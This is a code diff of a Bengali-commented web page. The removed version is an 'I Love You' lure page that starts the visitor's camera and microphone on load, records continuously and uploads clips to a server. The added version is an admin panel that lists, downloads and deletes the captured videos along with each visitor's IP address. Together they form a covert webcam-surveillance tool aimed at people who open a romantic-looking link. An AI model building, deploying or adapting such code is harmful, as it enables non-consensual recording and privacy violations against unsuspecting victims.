@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>I Love You ❤️</title>
+  <title>Admin Panel 🔒</title>
   <style>
     * {
       margin: 0;
@@ -12,275 +12,331 @@
     }
 
     body {
-      background: #000;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      font-family: 'Georgia', serif;
-      overflow: hidden;
-    }
-
-    .container {
-      position: relative;
-      width: 100%;
-      max-width: 800px;
+      background: #0a0a0a;
+      font-family: 'Arial', sans-serif;
+      color: #fff;
       padding: 20px;
-    }
-
-    /* ভিডিও প্রিভিউ (ব্যাকগ্রাউন্ডে) */
-    #video-preview {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      z-index: 0;
-      background: #000;
-      transform: scaleX(-1); /* মিরর ইফেক্ট */
-    }
-
-    /* কন্টেন্ট (টেক্সট) */
-    .content {
-      position: relative;
-      z-index: 10;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
       min-height: 100vh;
-      text-align: center;
-      pointer-events: none;
     }
 
-    .love-text {
-      font-size: 4.5rem;
+    .admin-container {
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 20px 0;
+      border-bottom: 2px solid #ff1493;
+      margin-bottom: 30px;
+      flex-wrap: wrap;
+      gap: 15px;
+    }
+
+    .header h1 {
+      font-size: 2rem;
+      color: #ff1493;
+      text-shadow: 0 0 20px rgba(255, 20, 147, 0.3);
+    }
+
+    .stats {
+      display: flex;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .stat-box {
+      background: rgba(255, 255, 255, 0.05);
+      padding: 10px 25px;
+      border-radius: 10px;
+      border: 1px solid rgba(255, 20, 147, 0.2);
+      text-align: center;
+    }
+
+    .stat-box .number {
+      font-size: 1.8rem;
       font-weight: bold;
       color: #ff1493;
-      text-shadow: 
-        0 0 20px rgba(255, 20, 147, 0.8),
-        0 0 40px rgba(255, 20, 147, 0.5),
-        0 0 80px rgba(255, 20, 147, 0.3);
-      animation: pulse 2s ease-in-out infinite;
-      letter-spacing: 4px;
-      font-family: 'Georgia', serif;
-      user-select: none;
     }
 
-    .sub-text {
-      color: rgba(255, 255, 255, 0.5);
-      font-size: 1.2rem;
-      margin-top: 20px;
-      letter-spacing: 2px;
-      font-family: 'Arial', sans-serif;
+    .stat-box .label {
+      font-size: 0.8rem;
+      color: #888;
+      margin-top: 5px;
     }
 
-    /* রেকর্ডিং ইন্ডিকেটর */
-    .recording-indicator {
-      display: none;
-      position: fixed;
-      top: 20px;
-      right: 20px;
-      z-index: 20;
-      background: rgba(255, 0, 0, 0.8);
-      color: white;
-      padding: 10px 20px;
-      border-radius: 30px;
-      font-size: 0.9rem;
-      font-family: 'Arial', sans-serif;
-      animation: blink 1s infinite;
+    /* ভিডিও গ্রিড */
+    .video-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+      gap: 25px;
     }
 
-    .recording-indicator.active {
+    .video-card {
+      background: rgba(255, 255, 255, 0.05);
+      border-radius: 15px;
+      overflow: hidden;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .video-card:hover {
+      transform: translateY(-5px);
+      box-shadow: 0 10px 40px rgba(255, 20, 147, 0.15);
+    }
+
+    .video-card video {
+      width: 100%;
+      height: 220px;
+      object-fit: cover;
+      background: #000;
       display: block;
     }
 
-    /* স্টার্ট বাটন */
-    .start-btn {
-      position: fixed;
-      bottom: 40px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 20;
-      background: rgba(255, 20, 147, 0.7);
-      color: white;
-      border: 2px solid #ff1493;
-      padding: 15px 40px;
-      border-radius: 50px;
-      font-size: 1.1rem;
-      font-family: 'Arial', sans-serif;
+    .video-info {
+      padding: 15px;
+    }
+
+    .video-info .timestamp {
+      color: #888;
+      font-size: 0.8rem;
+    }
+
+    .video-info .ip {
+      color: #666;
+      font-size: 0.75rem;
+      margin-top: 5px;
+    }
+
+    .video-actions {
+      padding: 10px 15px 15px;
+      display: flex;
+      gap: 10px;
+    }
+
+    .video-actions button {
+      flex: 1;
+      padding: 8px;
+      border: none;
+      border-radius: 8px;
       cursor: pointer;
-      pointer-events: auto;
+      font-size: 0.8rem;
       transition: all 0.3s;
-      backdrop-filter: blur(10px);
-      letter-spacing: 1px;
     }
 
-    .start-btn:hover {
-      background: #ff1493;
-      transform: translateX(-50%) scale(1.05);
-      box-shadow: 0 0 30px rgba(255, 20, 147, 0.5);
+    .btn-delete {
+      background: rgba(255, 0, 0, 0.2);
+      color: #ff4444;
+      border: 1px solid rgba(255, 0, 0, 0.3);
     }
 
-    .start-btn:disabled {
-      opacity: 0.5;
-      cursor: not-allowed;
-      transform: translateX(-50%) scale(0.95);
+    .btn-delete:hover {
+      background: rgba(255, 0, 0, 0.4);
     }
 
-    /* অ্যানিমেশন */
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); opacity: 1; }
-      50% { transform: scale(1.05); opacity: 0.9; }
+    .btn-download {
+      background: rgba(255, 20, 147, 0.2);
+      color: #ff1493;
+      border: 1px solid rgba(255, 20, 147, 0.3);
     }
 
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.3; }
+    .btn-download:hover {
+      background: rgba(255, 20, 147, 0.4);
     }
 
-    /* মোবাইল রেসপন্সিভ */
+    /* লোডিং/এম্পটি স্টেট */
+    .loading {
+      text-align: center;
+      padding: 60px 20px;
+      color: #666;
+    }
+
+    .loading .spinner {
+      width: 40px;
+      height: 40px;
+      border: 3px solid rgba(255, 20, 147, 0.1);
+      border-top: 3px solid #ff1493;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+
+    @keyframes spin {
+      to { transform: rotate(360deg); }
+    }
+
+    .empty {
+      text-align: center;
+      padding: 60px 20px;
+      color: #666;
+      font-size: 1.1rem;
+    }
+
+    .empty .icon {
+      font-size: 3rem;
+      margin-bottom: 15px;
+      display: block;
+    }
+
+    /* রেসপন্সিভ */
     @media (max-width: 600px) {
-      .love-text {
-        font-size: 2.8rem;
+      .header h1 {
+        font-size: 1.4rem;
       }
-      .sub-text {
-        font-size: 0.9rem;
-      }
-      .start-btn {
-        padding: 12px 25px;
-        font-size: 0.9rem;
-        bottom: 25px;
+      .video-grid {
+        grid-template-columns: 1fr;
       }
     }
   </style>
 </head>
 <body>
-  
-  <!-- ভিডিও প্রিভিউ (ব্যাকগ্রাউন্ড) -->
-  <video id="video-preview" autoplay playsinline muted></video>
+  <div class="admin-container">
+    <!-- হেডার -->
+    <div class="header">
+      <h1>🔒 অ্যাডমিন প্যানেল</h1>
+      <div class="stats">
+        <div class="stat-box">
+          <div class="number" id="totalVideos">0</div>
+          <div class="label">মোট ভিডিও</div>
+        </div>
+        <div class="stat-box">
+          <div class="number" id="todayVideos">0</div>
+          <div class="label">আজকের</div>
+        </div>
+      </div>
+    </div>
 
-  <!-- রেকর্ডিং ইন্ডিকেটর -->
-  <div class="recording-indicator" id="recordingIndicator">
-    🔴 RECORDING...
+    <!-- ভিডিও লিস্ট -->
+    <div id="videoList">
+      <div class="loading">
+        <div class="spinner"></div>
+        <p>লোড হচ্ছে...</p>
+      </div>
+    </div>
   </div>
-
-  <!-- কন্টেন্ট -->
-  <div class="content">
-    <div class="love-text">I Love You ❤️</div>
-    <div class="sub-text">তোমার জন্য আমার ভালোবাসা</div>
-  </div>
-
-  <!-- স্টার্ট বাটন -->
-  <button class="start-btn" id="startBtn">📸 ক্যামেরা চালু করুন</button>
 
   <script>
-    const videoPreview = document.getElementById('video-preview');
-    const startBtn = document.getElementById('startBtn');
-    const recordingIndicator = document.getElementById('recordingIndicator');
+    const videoList = document.getElementById('videoList');
+    const totalVideos = document.getElementById('totalVideos');
+    const todayVideos = document.getElementById('todayVideos');
 
-    let mediaStream = null;
-    let mediaRecorder = null;
-    let recordedChunks = [];
-    let isRecording = false;
-
-    // === ক্যামেরা চালু ===
-    async function startCamera() {
+    // === সব ভিডিও লোড ===
+    async function loadVideos() {
       try {
-        mediaStream = await navigator.mediaDevices.getUserMedia({
-          video: true,
-          audio: true
+        const response = await fetch('/api/videos');
+        const videos = await response.json();
+
+        if (!videos.length) {
+          videoList.innerHTML = `
+            <div class="empty">
+              <span class="icon">💔</span>
+              <p>কোনো ভিডিও পাওয়া যায়নি</p>
+              <small style="color:#444;">যতক্ষণ কেউ ভিডিও রেকর্ড না করে, ততক্ষণ এখানে কিছু দেখাবে না</small>
+            </div>
+          `;
+          updateStats(videos);
+          return;
+        }
+
+        // স্ট্যাট আপডেট
+        updateStats(videos);
+
+        // ভিডিও কার্ড তৈরি
+        let html = '<div class="video-grid">';
+        videos.forEach(video => {
+          const date = new Date(video.timestamp);
+          const formattedDate = date.toLocaleString('bn-BD', {
+            day: '2-digit',
+            month: '2-digit',
+            year: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit'
+          });
+
+          html += `
+            <div class="video-card" data-id="${video._id}">
+              <video controls>
+                <source src="${video.videoUrl}" type="video/webm">
+                আপনার ব্রাউজার ভিডিও সাপোর্ট করে না।
+              </video>
+              <div class="video-info">
+                <div class="timestamp">📅 ${formattedDate}</div>
+                <div class="ip">🌐 IP: ${video.ip || 'অজানা'}</div>
+              </div>
+              <div class="video-actions">
+                <button class="btn-download" onclick="downloadVideo('${video.videoUrl}')">⬇️ ডাউনলোড</button>
+                <button class="btn-delete" onclick="deleteVideo('${video._id}')">🗑️ ডিলিট</button>
+              </div>
+            </div>
+          `;
         });
-
-        videoPreview.srcObject = mediaStream;
-        startBtn.textContent = '🎥 রেকর্ডিং শুরু করুন';
-        startBtn.disabled = false;
-        startBtn.onclick = startRecording;
-
-        // স্বয়ংক্রিয়ভাবে রেকর্ডিং শুরু
-        startRecording();
+        html += '</div>';
+        videoList.innerHTML = html;
 
       } catch (err) {
-        console.error('Camera error:', err);
-        alert('❌ ক্যামেরা অ্যাক্সেস দেওয়া হয়নি। দয়া করে ব্রাউজারের অনুমতি দিন।');
-        startBtn.textContent = '🔄 পুনরায় চেষ্টা করুন';
-        startBtn.onclick = startCamera;
+        console.error('Load error:', err);
+        videoList.innerHTML = `
+          <div class="empty">
+            <span class="icon">⚠️</span>
+            <p>লোড করতে সমস্যা হয়েছে</p>
+            <button onclick="loadVideos()" style="margin-top:15px;padding:10px 30px;background:#ff1493;color:#fff;border:none;border-radius:10px;cursor:pointer;">পুনরায় চেষ্টা</button>
+          </div>
+        `;
       }
     }
 
-    // === রেকর্ডিং শুরু ===
-    function startRecording() {
-      if (isRecording) return;
+    // === স্ট্যাট আপডেট ===
+    function updateStats(videos) {
+      totalVideos.textContent = videos.length;
 
-      recordedChunks = [];
-      mediaRecorder = new MediaRecorder(mediaStream, {
-        mimeType: 'video/webm;codecs=vp9,opus'
-      });
+      const today = new Date();
+      today.setHours(0, 0, 0, 0);
+      
+      const todayCount = videos.filter(v => {
+        const vDate = new Date(v.timestamp);
+        vDate.setHours(0, 0, 0, 0);
+        return vDate.getTime() === today.getTime();
+      }).length;
 
-      mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) {
-          recordedChunks.push(e.data);
-        }
-      };
-
-      mediaRecorder.onstop = async () => {
-        const blob = new Blob(recordedChunks, { type: 'video/webm' });
-        await uploadVideo(blob);
-        isRecording = false;
-        recordingIndicator.classList.remove('active');
-        
-        // আবার রেকর্ডিং শুরু
-        setTimeout(startRecording, 2000);
-      };
-
-      mediaRecorder.start(1000); // প্রতি 1 সেকেন্ডে ডেটা সেভ
-      isRecording = true;
-      recordingIndicator.classList.add('active');
-      startBtn.textContent = '⏳ রেকর্ডিং চলছে...';
-      startBtn.disabled = true;
-
-      // ২ সেকেন্ড পর বাটন আবার সক্রিয়
-      setTimeout(() => {
-        startBtn.disabled = false;
-        startBtn.textContent = '⏹️ থামান (অটো আপলোড)';
-      }, 2000);
+      todayVideos.textContent = todayCount;
     }
 
-    // === ভিডিও আপলোড ===
-    async function uploadVideo(blob) {
-      const formData = new FormData();
-      formData.append('video', blob, 'love-video.webm');
+    // === ভিডিও ডিলিট ===
+    async function deleteVideo(id) {
+      if (!confirm('এই ভিডিও ডিলিট করবেন?')) return;
 
       try {
-        const response = await fetch('/api/upload', {
-          method: 'POST',
-          body: formData
+        const response = await fetch(`/api/video/${id}`, {
+          method: 'DELETE'
         });
-
         const data = await response.json();
+
         if (data.success) {
-          console.log('✅ Video uploaded:', data.videoUrl);
+          // কার্ড রিমুভ
+          const card = document.querySelector(`.video-card[data-id="${id}"]`);
+          if (card) card.remove();
+          loadVideos(); // রিফ্রেশ
         } else {
-          console.error('Upload failed:', data.error);
+          alert('ডিলিট করতে সমস্যা হয়েছে');
         }
       } catch (err) {
-        console.error('Upload error:', err);
+        alert('Error: ' + err.message);
       }
     }
 
-    // === পেজ লোড হলে অটো ক্যামেরা চালু ===
-    window.addEventListener('load', () => {
-      // একটু দেরি করে চালান
-      setTimeout(startCamera, 500);
-    });
+    // === ভিডিও ডাউনলোড ===
+    function downloadVideo(url) {
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = 'love-video.webm';
+      a.click();
+    }
 
-    // ব্রাউজার ট্যাব বন্ধ করলে স্ট্রিম বন্ধ
-    window.addEventListener('beforeunload', () => {
-      if (mediaStream) {
-        mediaStream.getTracks().forEach(track => track.stop());
-      }
-    });
+    // === অটো রিফ্রেশ (প্রতি ১০ সেকেন্ড) ===
+    loadVideos();
+    setInterval(loadVideos, 10000);
   </script>
 
 </body>
